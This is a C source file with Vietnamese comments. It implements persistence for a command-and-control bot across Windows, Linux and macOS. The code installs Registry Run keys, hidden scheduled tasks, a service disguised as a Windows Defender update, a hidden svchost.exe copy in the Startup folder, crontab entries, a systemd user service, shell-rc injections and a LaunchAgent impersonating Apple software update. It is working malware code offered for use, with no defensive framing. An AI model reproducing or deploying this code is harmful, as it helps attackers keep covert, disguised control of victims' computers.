/**
 * bot_persistence.c
 * Trien khai cac ham cai dat persistence cho bot
 * Ho tro: Windows (Registry, Scheduled Task, Service)
 *          Linux (crontab, systemd, .bashrc)
 *          MacOS (LaunchAgent)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
    #include <windows.h>
    #include <shlobj.h>
    #include <taskschd.h>
#else
    #include <unistd.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <pwd.h>
#endif

#include "bot_persistence.h"

/* Duong dan den bot hien tai */
static char g_duong_dan_bot[1024] = {0};

/**
 * Lay duong dan day du cua bot dang chay
 */
static void lay_duong_dan_bot(void) {
    if (strlen(g_duong_dan_bot) > 0) return; /* Da co */
    
#ifdef _WIN32
    GetModuleFileNameA(NULL, g_duong_dan_bot, sizeof(g_duong_dan_bot));
#else
    ssize_t len = readlink("/proc/self/exe", g_duong_dan_bot, sizeof(g_duong_dan_bot) - 1);
    if (len != -1) {
        g_duong_dan_bot[len] = '\0';
    } else {
        strcpy(g_duong_dan_bot, "/tmp/.c2bot");
    }
#endif
}

#ifdef _WIN32
/* ==================== WINDOWS PERSISTENCE ==================== */

/**
 * Them vao Registry Run key
 */
static int persistence_registry(void) {
    HKEY hkey;
    const char* key_path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* value_name = "WindowsSecurityUpdate";
    
    if (RegOpenKeyExA(HKEY_CURRENT_USER, key_path, 0, KEY_SET_VALUE, &hkey) != ERROR_SUCCESS) {
        /* Thu voi HKEY_LOCAL_MACHINE (can admin) */
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key_path, 0, KEY_SET_VALUE, &hkey) != ERROR_SUCCESS) {
            return -1;
        }
    }
    
    lay_duong_dan_bot();
    
    if (RegSetValueExA(hkey, value_name, 0, REG_SZ, 
                       (BYTE*)g_duong_dan_bot, 
                       (DWORD)(strlen(g_duong_dan_bot) + 1)) == ERROR_SUCCESS) {
        RegCloseKey(hkey);
        return 0;
    }
    
    RegCloseKey(hkey);
    return -1;
}

/**
 * Tao Scheduled Task
 */
static int persistence_scheduled_task(void) {
    lay_duong_dan_bot();
    
    /* Tao command line de tao scheduled task */
    char cmd[2048];
    snprintf(cmd, sizeof(cmd),
             "schtasks /create /tn \"WindowsUpdateChecker\" /tr \"%s\" "
             "/sc hourly /mo 1 /f /rl HIGHEST",
             g_duong_dan_bot);
    
    /* Thuc thi lenh */
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 0;
    }
    
    return -1;
}

/**
 * Tao Windows Service
 */
static int persistence_service(void) {
    lay_duong_dan_bot();
    
    SC_HANDLE sc_manager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (sc_manager == NULL) return -1;
    
    SC_HANDLE service = CreateServiceA(
        sc_manager,
        "WindowsDefenderUpdate",         /* Ten service */
        "Windows Defender Update Service", /* Ten hien thi */
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,              /* Tu dong khoi dong */
        SERVICE_ERROR_NORMAL,
        g_duong_dan_bot,
        NULL, NULL, NULL, NULL, NULL
    );
    
    if (service != NULL) {
        /* Dat mo ta */
        SERVICE_DESCRIPTIONA desc;
        desc.lpDescription = "Provides protection against viruses and other malware for Windows";
        ChangeServiceConfig2A(service, SERVICE_CONFIG_DESCRIPTION, &desc);
        
        /* Khoi dong service */
        StartServiceA(service, 0, NULL);
        
        CloseServiceHandle(service);
        CloseServiceHandle(sc_manager);
        return 0;
    }
    
    /* Neu service da ton tai, thu mo va start */
    service = OpenServiceA(sc_manager, "WindowsDefenderUpdate", SERVICE_ALL_ACCESS);
    if (service != NULL) {
        StartServiceA(service, 0, NULL);
        CloseServiceHandle(service);
        CloseServiceHandle(sc_manager);
        return 0;
    }
    
    CloseServiceHandle(sc_manager);
    return -1;
}

/**
 * Copy bot vao thu muc Startup
 */
static int persistence_startup_folder(void) {
    lay_duong_dan_bot();
    
    char startup_path[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path) != S_OK) {
        return -1;
    }
    
    char dest_path[MAX_PATH];
    snprintf(dest_path, sizeof(dest_path), "%s\\svchost.exe", startup_path);
    
    if (CopyFileA(g_duong_dan_bot, dest_path, FALSE)) {
        /* Dat thuoc tinh an */
        SetFileAttributesA(dest_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        return 0;
    }
    
    return -1;
}

void cai_dat_persistence(void) {
    printf("[PERSIST] Dang cai dat persistence...\n");
    
    /* Thu tung phuong phap */
    if (persistence_registry() == 0) {
        printf("[PERSIST] Registry Run OK\n");
    }
    
    if (persistence_scheduled_task() == 0) {
        printf("[PERSIST] Scheduled Task OK\n");
    }
    
    if (persistence_startup_folder() == 0) {
        printf("[PERSIST] Startup Folder OK\n");
    }
    
    /* Service can admin, thu neu co quyen */
    if (persistence_service() == 0) {
        printf("[PERSIST] Windows Service OK\n");
    }
    
    printf("[PERSIST] Hoan tat cai dat persistence\n");
}

#else
/* ==================== LINUX/MACOS PERSISTENCE ==================== */

/**
 * Them vao crontab
 */
static int persistence_crontab(void) {
    lay_duong_dan_bot();
    
    /* Tao cron entry */
    char cron_entry[2048];
    snprintf(cron_entry, sizeof(cron_entry),
             "@reboot %s > /dev/null 2>&1\n"
             "*/30 * * * * %s > /dev/null 2>&1\n",
             g_duong_dan_bot, g_duong_dan_bot);
    
    /* Ghi vao file crontab tam */
    char temp_file[] = "/tmp/.cron_tmp_XXXXXX";
    int fd = mkstemp(temp_file);
    if (fd < 0) return -1;
    
    write(fd, cron_entry, strlen(cron_entry));
    close(fd);
    
    /* Cai dat crontab */
    char cmd[4096];
    snprintf(cmd, sizeof(cmd), "crontab %s 2>/dev/null", temp_file);
    system(cmd);
    
    unlink(temp_file);
    return 0;
}

/**
 * Them vao systemd user service
 */
static int persistence_systemd(void) {
    lay_duong_dan_bot();
    
    /* Xac dinh thu muc systemd user */
    const char* home = getenv("HOME");
    if (home == NULL) home = "/root";
    
    char service_dir[1024];
    snprintf(service_dir, sizeof(service_dir), "%s/.config/systemd/user", home);
    
    /* Tao thu muc neu chua ton tai */
    char mkdir_cmd[2048];
    snprintf(mkdir_cmd, sizeof(mkdir_cmd), "mkdir -p %s 2>/dev/null", service_dir);
    system(mkdir_cmd);
    
    /* Tao file service */
    char service_file[2048];
    snprintf(service_file, sizeof(service_file), "%s/c2bot.service", service_dir);
    
    FILE* f = fopen(service_file, "w");
    if (f == NULL) return -1;
    
    fprintf(f, "[Unit]\n");
    fprintf(f, "Description=C2 Bot Service\n");
    fprintf(f, "After=network.target\n\n");
    fprintf(f, "[Service]\n");
    fprintf(f, "Type=simple\n");
    fprintf(f, "ExecStart=%s\n", g_duong_dan_bot);
    fprintf(f, "Restart=always\n");
    fprintf(f, "RestartSec=60\n\n");
    fprintf(f, "[Install]\n");
    fprintf(f, "WantedBy=default.target\n");
    
    fclose(f);
    
    /* Enable va start service */
    system("systemctl --user daemon-reload 2>/dev/null");
    system("systemctl --user enable c2bot.service 2>/dev/null");
    system("systemctl --user start c2bot.service 2>/dev/null");
    
    return 0;
}

/**
 * Them vao .bashrc / .zshrc / .profile
 */
static int persistence_shell_rc(void) {
    lay_duong_dan_bot();
    
    const char* home = getenv("HOME");
    if (home == NULL) home = "/root";
    
    const char* rc_files[] = {
        ".bashrc",
        ".zshrc",
        ".profile",
        ".bash_profile",
        NULL
    };
    
    for (int i = 0; rc_files[i] != NULL; i++) {
        char rc_path[1024];
        snprintf(rc_path, sizeof(rc_path), "%s/%s", home, rc_files[i]);
        
        /* Kiem tra file ton tai */
        if (access(rc_path, F_OK) != 0) continue;
        
        /* Kiem tra da co entry chua */
        FILE* f = fopen(rc_path, "r");
        if (f != NULL) {
            char line[1024];
            int found = 0;
            while (fgets(line, sizeof(line), f)) {
                if (strstr(line, g_duong_dan_bot) != NULL) {
                    found = 1;
                    break;
                }
            }
            fclose(f);
            if (found) continue; /* Da co, bo qua */
        }
        
        /* Them entry */
        f = fopen(rc_path, "a");
        if (f != NULL) {
            fprintf(f, "\n# System update service\n");
            fprintf(f, "%s > /dev/null 2>&1 &\n", g_duong_dan_bot);
            fclose(f);
        }
    }
    
    return 0;
}

#ifdef __APPLE__
/**
 * Them vao LaunchAgent (MacOS)
 */
static int persistence_launch_agent(void) {
    lay_duong_dan_bot();
    
    const char* home = getenv("HOME");
    if (home == NULL) home = "/Users/Shared";
    
    char launch_dir[1024];
    snprintf(launch_dir, sizeof(launch_dir), "%s/Library/LaunchAgents", home);
    
    char mkdir_cmd[2048];
    snprintf(mkdir_cmd, sizeof(mkdir_cmd), "mkdir -p %s 2>/dev/null", launch_dir);
    system(mkdir_cmd);
    
    char plist_path[2048];
    snprintf(plist_path, sizeof(plist_path), 
             "%s/com.apple.softwareupdate.plist", launch_dir);
    
    FILE* f = fopen(plist_path, "w");
    if (f == NULL) return -1;
    
    fprintf(f, "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
    fprintf(f, "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
               "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n");
    fprintf(f, "<plist version=\"1.0\">\n");
    fprintf(f, "<dict>\n");
    fprintf(f, "    <key>Label</key>\n");
    fprintf(f, "    <string>com.apple.softwareupdate</string>\n");
    fprintf(f, "    <key>ProgramArguments</key>\n");
    fprintf(f, "    <array>\n");
    fprintf(f, "        <string>%s</string>\n", g_duong_dan_bot);
    fprintf(f, "    </array>\n");
    fprintf(f, "    <key>RunAtLoad</key>\n");
    fprintf(f, "    <true/>\n");
    fprintf(f, "    <key>KeepAlive</key>\n");
    fprintf(f, "    <true/>\n");
    fprintf(f, "    <key>StartInterval</key>\n");
    fprintf(f, "    <integer>1800</integer>\n");
    fprintf(f, "</dict>\n");
    fprintf(f, "</plist>\n");
    
    fclose(f);
    
    /* Load launch agent */
    char load_cmd[2048];
    snprintf(load_cmd, sizeof(load_cmd), 
             "launchctl load %s 2>/dev/null", plist_path);
    system(load_cmd);
    
    return 0;
}
#endif

void cai_dat_persistence(void) {
    printf("[PERSIST] Dang cai dat persistence...\n");
    
    /* Thu tung phuong phap */
    if (persistence_crontab() == 0) {
        printf("[PERSIST] Crontab OK\n");
    }
    
    if (persistence_systemd() == 0) {
        printf("[PERSIST] Systemd service OK\n");
    }
    
    if (persistence_shell_rc() == 0) {
        printf("[PERSIST] Shell RC OK\n");
    }
    
#ifdef __APPLE__
    if (persistence_launch_agent() == 0) {
        printf("[PERSIST] LaunchAgent OK\n");
    }
#endif
    
    printf("[PERSIST] Hoan tat cai dat persistence\n");
}

#endif /* _WIN32 */